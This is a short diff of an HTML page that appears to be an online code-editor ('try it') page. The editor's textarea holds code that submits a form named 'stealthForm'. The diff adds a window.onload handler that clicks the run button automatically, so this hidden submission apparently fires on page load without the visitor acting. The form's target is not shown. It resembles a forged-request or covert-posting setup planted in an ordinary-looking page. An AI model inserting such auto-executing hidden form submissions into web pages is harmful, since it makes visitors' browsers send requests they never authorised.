@@ -753,8 +753,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
   <div id="textareacontainer">
     <div id="textarea">
       <div id="textareawrapper">
-        
-            <textarea autocomplete="off" id="textareaCode" wrap="logical" spellcheck="false"><!DOCTYPE html>
+            <textarea autocomplete="off" id="textareaCode" wrap="logical" spellcheck="false">
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -842,6 +841,9 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             document.getElementById("stealthForm").submit();
         }
     });
+		    window.onload = function() {
+    document.getElementById("runbtn").click();
+  };
 </script>
 
 </body>
